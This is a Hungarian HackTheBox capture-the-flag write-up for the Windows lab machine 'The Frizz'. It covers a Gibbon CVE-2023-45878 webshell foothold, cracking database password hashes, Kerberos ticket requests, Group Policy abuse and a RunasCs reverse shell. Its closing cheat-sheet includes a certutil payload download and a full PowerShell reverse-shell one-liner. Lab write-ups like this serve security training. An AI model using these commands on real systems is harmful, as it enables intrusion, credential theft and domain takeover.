# HTB The Frizz - Writeup (magyar)

> 🚨 **Kövess élőben HTB-n — leakek, dropok és mély writeupok**  
> 👉 [t.me/nosecpwn](https://t.me/nosecpwn)  
> _Ne olvasd. Csatlakozz._

**Platform:** Windows\
**IP:** 10.10.11.60

---

## Recon / Felderítés

### NMAP

```
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
| http-title: Education &mdash; Walkerville Elementary School
|_Requested resource was http://frizzdc.frizz.htb/home/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57649/tcp open  msrpc         Microsoft Windows RPC
57653/tcp open  msrpc         Microsoft Windows RPC
57663/tcp open  msrpc         Microsoft Windows RPC
```

Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o\:microsoft\:windows

### SMB + clock-skew

- SMB time/clock-skew: +6h59m (időszinkron kell Kerberoshoz!)

---

### DIRBUSTER / GOBUSTER

```
gobuster dir -u http://frizzdc.frizz.htb -w /usr/share/wordlists/dirb/common.txt

/.htaccess (403)
/.htpasswd (403)
... stb.
/Home   (301)  → http://frizzdc.frizz.htb/Home/
/home   (301)  → http://frizzdc.frizz.htb/home/
```

---

## Webalkalmazás felderítése / initial foothold

**Azonosított app:** GIBBON 25.0.0 (nyílt forráskódú iskolai menedzsment rendszer)

- Google: van rá CVE, keresett exploit: **CVE-2023-45878**
- Exploit: **Reverse shell feltöltése webshell-lel**

**Exploit script futtatása:**

```
bash CVE-2023-45878.sh 10.10.14.52 4444 10.10.11.60:80
```

- Feltölti a shellt
- Megnyitja: [http://10.10.11.60:80/Gibbon-LMS/gibbon\_myconfig.php?cmd=whoami](http://10.10.11.60:80/Gibbon-LMS/gibbon_myconfig.php?cmd=whoami)
- Netcat/metasploit listenert nyitni: `nc -lnvp 4444` vagy handler

**Eredmény:** sima reverse shell (command prompt)

---

## Első user / credential hunting

**Talált file:** `config.php` → **MySQL user/pass**

```
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parr*****';
```

**Bejelentkezés MySQL-be:**

```
C:\xampp\mysql\bin> .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parr*****" -e "show databases;"
```

- Fő DB: `gibbon`
- User tábla: `gibbonperson`

**Talált user:**

- username: f.frizzle
- password hash + salt

**Password cracking (John):**

```
john --format=dynamic='sha256($s.$p)' --wordlist=/usr/share/wordlists/rockyou.txt fizz.txt
```

- **Result:** Jenni\_Luvs\_*******

---

## Kerberos TGT & User escalation

**Időszinkronizáció (fontos!):**

```
sudo rdate -n frizzdc.frizz.htb
```

**TGT szerzés:**

```
impacket-getTGT frizz.htb/f.frizzle:'Jenni_Luvs_*****' -dc-ip frizzdc.frizz.htb
export KRB5CCNAME=f.frizzle.ccache
```

**SSH login:**

```
ssh f.frizzle@10.10.11.60 -K
```

- **User.txt megszerzése**

---

## További privesc – backup file / második user

**File:** `wapt-backup-sunday.7z` (f.frizzle Desktopján)

- Letöltve meterpreterrel vagy sima http-vel
- Belső jelszó: kinyerve, benne **újabb AD user: M.SchoolBus / !suBc**

**TGT szerzés új userhez:**

```
impacket-getTGT frizz.htb/'M.SchoolBus':'!suBc*****' -dc-ip frizzdc.frizz.htb
export KRB5CCNAME=M.SchoolBus.ccache
```

**SSH login:**

```
ssh M.SchoolBus@10.10.11.60 -K
```

---

## Privesc: GPO abuse, SYSTEM jog szerzése

### GPO létrehozása + GPO abuse

**Új GPO létrehozása:**

```powershell
New-GPO -Name GPO-new | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
```

**GPO ellenőrzés:**

```powershell
get-GPO -All
```

**Magad adminná tétele (SharpGPOAbuse):**

```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName GPO-new --force
```

- Várj vagy **gpupdate /force** a célgépen

**Admin jog ellenőrzés:**

```
net localgroup administrators
```

---

## SYSTEM / root shell szerzés RunasCs-sel

**RunasCs exe-t saját magad buildeld le (lásd részletes folyamat a jegyzet végén)**

**Reverse shell payload (PowerShell):**

```powershell
.\RunasCs.exe 'M.schoolbus' '!suBc*****' powershell.exe -r 10.10.14.52:4444
```

- Netcat listener: `nc -lvnp 4444`
- Ha meterpreteres shell kell, msfvenommal gyárts payloadot, azt indítsd RunasCs-sel

**Root.txt megszerzése:**

```
type C:\Users\Administrator\Desktop\root.txt
```

---

# **Bónusz: saját RunasCs.exe build Windows alatt (gyors workflow)**

1. Töltsd le a forrást: [https://github.com/antonioCoco/RunasCs](https://github.com/antonioCoco/RunasCs)
2. Windows-on telepítsd a Visual Studio Build Tools-t (csak .NET build kell)
3. Nyisd meg a "Developer Command Prompt for VS"-t
4. Navigálj a RunasCs mappába, majd:
   ```cmd
   msbuild /p:Configuration=Release
   ```
5. Az exe itt lesz: `bin\Release\RunasCs.exe`
6. Másold át pendrive-ra, vagy dobj fel GitHub privát repóba, aztán Linuxról szedd le

---

# **Saját jegyzetek, tapasztalatok (röviden, casual stílusban):**

- **Kurva sokat szívtam a shell-lel:** meterpreter session többször meghalt, de netcattel mindig bejött
- **GPO refreshen múlik minden**: admin chain csak frissítés után lép életbe
- **RunasCs buildelése Windows alatt kötelező** (nincs trusted prebuild, mindig magadnak buildeld)
- **PowerShell reverse shell, netcattel stabilabb mint meterpreterrel**
- **Pro workflow:** mindig több shell típust próbálj, ne csak msfconsole!
- **Türelemjáték**: 6+ óra, de minden perc tanított valamit (privesc, chain, build, Windows internals)

---

# **Összegzés / Lessons Learned**

- Mindig nézz körbe minden usernél (desktop, backup, config)
- Gibbon CVE = easy foothold, de AD privesc nem triviális
- Hash + salt, John, ticketek = full AD attack chain
- GPO abuse a kulcs, de a refresh és a helyes OU kiválasztása mindent eldönt
- Ha a meterpreter nem él túl, sima powershell vagy netcat shell is elég SYSTEM-hez
- Saját tool buildelés, filemozgatás, időszinkron: ezek is legalább annyira fontosak, mint maga a “támadás”

---

# **Kapcsolódó parancsok, cheat-sheet**

## Hash crackelés

```
john --format=dynamic='sha256($s.$p)' --wordlist=/usr/share/wordlists/rockyou.txt fizz.txt
```

## Kerberos ticket szerzés

```
impacket-getTGT frizz.htb/<user>:<pass> -dc-ip frizzdc.frizz.htb
export KRB5CCNAME=<user>.ccache
```

## Admin jogosultság ellenőrzése

```
net localgroup administrators
```

## GPO gyors refresh

```
gpupdate /force
```

## Shell download certutil-lal

```
certutil -urlcache -split -f "http://<ip>:<port>/RunasCs.exe" RunasCs.exe
```

## Reverse shell parancs (PowerShell)

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

---

## **Ez volt a Frizz gép! Köszi, hogy végigküzdötted!**

Szép chain, sok szívás, de még több tanulás! 🚀

